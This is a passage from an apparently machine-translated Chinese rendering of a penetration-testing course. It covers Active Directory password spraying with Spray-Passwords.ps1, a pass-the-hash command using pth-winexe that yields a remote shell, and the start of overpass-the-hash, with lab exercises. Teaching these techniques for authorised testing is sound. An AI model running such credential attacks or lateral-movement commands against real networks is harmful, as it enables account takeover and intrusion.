<div style="position:absolute;top:44902;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 分类信息    </font></font></nobr></div>
<div style="position:absolute;top:44902;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: NotSpecified: (:) [format-default], ExtendedTypeSystemExce</font></font></nobr></div>
<div style="position:absolute;top:44919;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ FullQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.Forma</font></font></nobr></div>
<div style="position:absolute;top:44938;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 698 - DirectoryEntry 使用的密码不正确</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过这种方式，我们可以创建一个 PowerShell 脚本来枚举所有用户并执行</font></font></nobr></div>
<div style="position:absolute;top:44987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锁定阈值</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">锁定观察窗口进行</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:45019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此攻击的现有实现称为 Spray-Passwords.ps1 </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">665</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位于</font></font></nobr></div>
<div style="position:absolute;top:45039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 客户端的 C:\Tools\active_directory 文件夹。</font></font></nobr></div>
<div style="position:absolute;top:45072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-pass</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项允许我们一个密码设置为测试，或者我们可以提交一个单词列表文件，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-</font></font></i></nobr></div>
<div style="position:absolute;top:45091;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">我们还可以通过添加</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-Admin</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">来测试管理员帐户</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:45191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">665 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Improsec，2016 年），https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:45319;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="39"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 39 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:45352;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:46429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:46429;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:46429;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">656</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Tools\active_directory&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.\Spray-Passwords.ps1 -Pass Qwerty09！</font><font style="vertical-align: inherit;">-行政</font></font></font></b></nobr></div>
<div style="position:absolute;top:45467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">警告：也针对管理员帐户。</font></font></nobr></div>
<div style="position:absolute;top:45484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行蛮力 - 按 [q] 停止进程并打印结果...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:45501;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户的猜测密码：'Administrator' = 'Qwerty09!'</font></font></b></nobr></div>
<div style="position:absolute;top:45518;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户的猜测密码：'offsec' = 'Qwerty09!'</font></font></b></nobr></div>
<div style="position:absolute;top:45535;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户猜测的密码：'adam' = 'Qwerty09!'</font></font></b></nobr></div>
<div style="position:absolute;top:45552;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户的猜测密码：'iis_service' = 'Qwerty09!'</font></font></b></nobr></div>
<div style="position:absolute;top:45568;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户的猜测密码：'sql_service' = 'Qwerty09!'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在停止蛮力......</font></font></nobr></div>
<div style="position:absolute;top:45603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网友猜测是：</font></font></nobr></div>
<div style="position:absolute;top:45620;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“管理员”密码：“Qwerty09！”</font></font></nobr></div>
<div style="position:absolute;top:45637;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'offsec' 密码：'Qwerty09!'</font></font></nobr></div>
<div style="position:absolute;top:45653;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'adam' 密码：'Qwerty09!'</font></font></nobr></div>
<div style="position:absolute;top:45670;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'iis_service' 密码：'Qwerty09!'</font></font></nobr></div>
<div style="position:absolute;top:45687;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'sql_service' 密码：'Qwerty09!'</font></font></nobr></div>
<div style="position:absolute;top:45707;left:284"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 699 - 使用 Spray-Passwords 攻击用户帐户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个简单的例子产生了快速的结果，但通常情况下，我们需要使用一个词表</font></font></nobr></div>
<div style="position:absolute;top:45756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有良好的密码候选者。</font></font></nobr></div>
<div style="position:absolute;top:45788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在已经发现了在以下情况下获取用户和服务帐户凭据的方法</font></font></nobr></div>
<div style="position:absolute;top:45807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击 Active Directory 及其身份验证协议。</font><font style="vertical-align: inherit;">接下来，我们可以开始利用它来</font></font></nobr></div>
<div style="position:absolute;top:45827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">破坏域中的其他计算机，最好是那些具有高价值登录用户的计算机。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:45861;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3.5.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1、使用本模块中的PowerShell脚本猜测jeff_admin用户的密码。</font></font></nobr></div>
<div style="position:absolute;top:45920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.使用Spray-Passwords.ps1工具对所有用户进行查找暴力攻击</font></font></nobr></div>
<div style="position:absolute;top:45939;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码列表中的域。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:45976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4 Active Directory 横向移动</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在前面的部分中，我们找到了可能导致完整 Active Directory 的高价值目标</font></font></nobr></div>
<div style="position:absolute;top:46037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">妥协并找到这些目标登录的工作站或服务器。</font><font style="vertical-align: inherit;">我们聚集了</font></font></nobr></div>
<div style="position:absolute;top:46057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码哈希，恢复现有票证，并利用它们进行 Kerberos 身份验证。</font></font></nobr></div>
<div style="position:absolute;top:46089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将使用横向移动来破坏我们记录高价值目标的机器</font></font></nobr></div>
<div style="position:absolute;top:46109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入。</font></font></nobr></div>
<div style="position:absolute;top:46142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们方法中合乎逻辑的下一步是破解我们获得的任何密码哈希值，并</font></font></nobr></div>
<div style="position:absolute;top:46161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用明文密码对机器进行身份验证，以获得未经授权的访问。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:46180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码破解需要时间并且可能会失败。</font><font style="vertical-align: inherit;">此外，Kerberos 和 NTLM 不使用明文</font></font></nobr></div>
<div style="position:absolute;top:46200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接密码和 Microsoft 的本机工具不支持使用</font></font></nobr></div>
<div style="position:absolute;top:46219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码哈希。</font></font></nobr></div>
<div style="position:absolute;top:46252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下一节中，我们将探索另一种横向运动技术，它可以让我们</font></font></nobr></div>
<div style="position:absolute;top:46271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅使用用户的哈希或 Kerberos 票证对系统进行身份验证并获得代码执行。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:46507;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="40"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 40 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:46540;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:47617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:47617;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:47617;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">657</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:46636;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.1</font></font></i></nobr></div>
<div style="position:absolute;top:46636;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传递哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:46674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所述</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通行证的散列</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PTH）技术允许攻击者认证到远程系统或服务</font></font></nobr></div>
<div style="position:absolute;top:46693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用用户的 NTLM 哈希而不是关联的明文密码。</font><font style="vertical-align: inherit;">请注意，这将不起作用</font></font></nobr></div>
<div style="position:absolute;top:46712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于 Kerberos 身份验证，但仅用于使用 NTLM 身份验证的服务器或服务。</font></font></nobr></div>
<div style="position:absolute;top:46745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许多第三方工具和框架使用 PtH 来允许用户进行身份验证和获取代码</font></font></nobr></div>
<div style="position:absolute;top:46765;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行，包括来自 Metasploit 的 PsExec、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">666</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Passing-the-hash 工具包、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">667</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 Impacket。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">668</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font></nobr></div>
<div style="position:absolute;top:46784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们背后的机制或多或少相同，因为攻击者使用</font></font></nobr></div>
<div style="position:absolute;top:46804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器消息块 (SMB) 协议并使用 NTLM 哈希执行身份验证。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">669</font></font></font></nobr></div>
<div style="position:absolute;top:46836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数用于利用 PtH 的工具都会创建和启动 Windows 服务（例如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font></nobr></div>
<div style="position:absolute;top:46856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 的实例）并使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命名管道</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与它通信</font><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">670</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是使用完成</font></font></nobr></div>
<div style="position:absolute;top:46875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务控制管理器</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">671</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> API。</font></font></nobr></div>
<div style="position:absolute;top:46908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此技术需要通过防火墙（通常是端口 445）的 SMB 连接，并且</font></font></nobr></div>
<div style="position:absolute;top:46927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用</font><font style="vertical-align: inherit;">Windows</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件和打印共享</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能。</font><font style="vertical-align: inherit;">这些要求在内部很常见</font></font></nobr></div>
<div style="position:absolute;top:46946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企业环境。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:47008;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行连接时，它通常使用一个特殊的管理共享，称为</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47028;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员$ </font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">为了建立与此共享的连接，攻击者必须</font></font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:47047;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供具有本地管理权限的有效凭据。</font><font style="vertical-align: inherit;">换句话说，</font></font></i></nobr></div>
<div style="position:absolute;top:47067;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种横向移动通常需要地方行政权。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，PtH 合法地使用 NTLM 哈希。</font><font style="vertical-align: inherit;">然而，脆弱性在于我们</font></font></nobr></div>
<div style="position:absolute;top:47148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未经授权访问了本地管理员的密码哈希。</font></font></nobr></div>
<div style="position:absolute;top:47181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了证明这一点，我们可以使用</font><font style="vertical-align: inherit;">Passing-The-Hash 工具包中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pth-winexe</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，就像我们在</font></font></nobr></div>
<div style="position:absolute;top:47200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将哈希传递给密码攻击模块中的非域加入用户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:47252;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eb3b9f05c425e //10.11.0.22 cmd</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:47269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用 E_md4hash 包装器。</font></font></nobr></div>
<div style="position:absolute;top:47286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HASH PASS：替换用户提供的 NTLM HASH ...</font></font></nobr></div>
<div style="position:absolute;top:47303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.16299.309]</font></font></nobr></div>
<div style="position:absolute;top:47320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2017 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:47354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:47373;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 700 - 使用 pth-winexe 传递哈希</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:47467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">666 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Metasploit，2017），https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/</font></font></font></nobr></div>
<div style="position:absolute;top:47487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">667 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（@byt3bl33d3r，2015），https://github.com/byt3bl33d3r/pth-toolkit</font></font></font></nobr></div>
<div style="position:absolute;top:47507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">668 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（核心安全，2017），https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py</font></font></font></nobr></div>
<div style="position:absolute;top:47527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">669 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/aa365234 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:47547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">670 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/aa365590 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:47567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">671 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/ms685150 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:47695;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="41"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 41 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:47728;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:48805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:48805;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:48805;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">658</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本例中，我们使用 NTLM 身份验证在 Windows 10 客户端上获取代码执行</font></font></nobr></div>
<div style="position:absolute;top:47843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接来自我们的 Kali Linux，仅配备用户的 NTLM 哈希。</font></font></nobr></div>
<div style="position:absolute;top:47876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此方法适用于 Active Directory 域帐户和内置本地管理员</font></font></nobr></div>
<div style="position:absolute;top:47895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户。</font><font style="vertical-align: inherit;">自 2014 年安全更新以来，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">672</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此技术不能用作任何身份验证</font></font></nobr></div>
<div style="position:absolute;top:47915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他本地管理员帐户。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:47949;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.4.2</font></font></i></nobr></div>
<div style="position:absolute;top:47949;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">超越哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:47987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">立交桥的哈希</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">673</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以“在”滥用NTLM用户哈希以获得一个完整的Kerberos票据</font></font></nobr></div>
<div style="position:absolute;top:48006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">授予票证 (TGT) 或服务票证，授予我们访问另一台机器或服务的权限</font></font></nobr></div>
<div style="position:absolute;top:48026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">那个用户。</font></font></nobr></div>
<div style="position:absolute;top:48059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了证明这一点，让我们假设我们已经破坏了一个工作站（或服务器），</font></font></nobr></div>
<div style="position:absolute;top:48078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jeff_Admin 用户已通过身份验证，该机器现在正在缓存他们的凭据（和</font></font></nobr></div>
<div style="position:absolute;top:48097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此他们的 NTLM 密码哈希）。</font></font></nobr></div>
<div style="position:absolute;top:48130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了模拟这个缓存的凭证，我们将作为 Offsec 用户登录到 Windows 10 机器</font></font></nobr></div>
<div style="position:absolute;top:48150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并以 Jeff_Admin 身份运行一个进程，提示身份验证。</font></font></nobr></div>
<div style="position:absolute;top:48182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最简单的方法是右键单击任务栏上的记事本图标，然后右移</font></font></nobr></div>
<div style="position:absolute;top:48202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">弹出窗口中的记事本图标，产生图 311 中的选项。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48567;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 311：以不同用户身份启动记事本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从这里，我们可以选择“以不同用户身份运行”并输入“jeff_admin”作为用户名以及</font></font></nobr></div>
<div style="position:absolute;top:48617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关联的密码，它将在该用户的上下文中启动记事本。</font><font style="vertical-align: inherit;">成功后</font></font></nobr></div>
<div style="position:absolute;top:48636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证，Jeff_Admin 的凭据将缓存在此计算机上。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
